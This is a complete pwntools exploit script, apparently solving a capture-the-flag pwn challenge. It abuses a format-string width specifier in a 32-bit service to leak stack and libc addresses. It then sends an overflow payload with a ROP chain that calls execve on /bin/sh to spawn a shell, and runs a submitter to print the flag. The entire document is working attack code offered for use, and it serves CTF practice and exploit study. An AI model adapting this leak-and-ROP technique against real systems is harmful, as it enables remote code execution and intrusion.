import argparse
import codecs

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'
context.arch='i386'


PATH = "/handout/challenge"
LIBC = "/handout/libc.so.6"
LD = "/handout/ld-linux.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
#    r = process(PATH)
    r = gdb.debug(PATH, f'''
file {PATH}
b *main+0x1ed
c
''', api=True)

# for i in range(2000):
#    r.sendlineafter(b"format string: (eg \"{:#x}\")\n", f"{{0:a>{i}}}".encode())
#    r.recvuntil(b"42")
#    leak = r.recvuntil(b"Enter ")[:-7]
#    if len(leak) > 0:
#        print(f"{i} {leak} {codecs.encode(leak[::-1], 'hex').decode()}")

r.sendlineafter(b"format string: (eg \"{:#x}\")\n", f"{{0:a>256}}".encode())
r.recvuntil(b"42")
stack_leak = u32(r.recv(4))

r.sendlineafter(b"format string: (eg \"{:#x}\")\n", f"{{0:a>372}}".encode())
r.recvuntil(b"42")
libc_base = u32(r.recv(4)) - (0xf7a52519 - 0xf7a51000) + (0xf7b25000 - 0xf7b45000)

#r.sendlineafter(b"format string: (eg \"{:#x}\")\n", f"{{0:a>408}}".encode())
#r.recvuntil(b"42")
#img_base = u32(r.recvuntil(b"Enter ")[1:-6].ljust(8, b'\x00')) - (0x5597c1315810 - 0x00005597c1315000)

print(f"stack_leak = {stack_leak:#x}")
print(f"libc_base = {libc_base:#x}")
#print(f"img_base = {img_base:#x}")


As = 0xff97dc3c-0xff97dae8
print(f"{As} as")

bin_sh = libc_base + 0x1bd0d5

payload = f"{{0:a>{As}}}".encode()
payload += p32(stack_leak + 0xffa9d12c - 0xffa9cec8 + 4)  # ecx
payload += p32(bin_sh) # ebx
payload += b"\x03\x03\x03\x03" # edi
payload += b"\x04\x04\x04\x04" # ebp

# rop time

payload += b"".join([p32(g) for g in [
    libc_base + 0x00037374, # pop ecx ; pop edx ; retn 
    stack_leak - 0x1000, # ecx
    stack_leak - 0x1000, # edx
    libc_base + 0x00034ec0, # xor eax, eax ; retn
    libc_base + 0x001959e8, # add eax, 0xb ; retn
    libc_base + 0x000de3ba, # int 0x80
]])

print(payload)
assert b'\x00' not in payload
r.sendlineafter(b"format string: (eg \"{:#x}\")\n", payload)

r.sendline(b"")


r.sendline(b"./submitter")
r.recvuntil(b"Flag: ")
print(r.recvuntil(b"\n").decode(), end='')

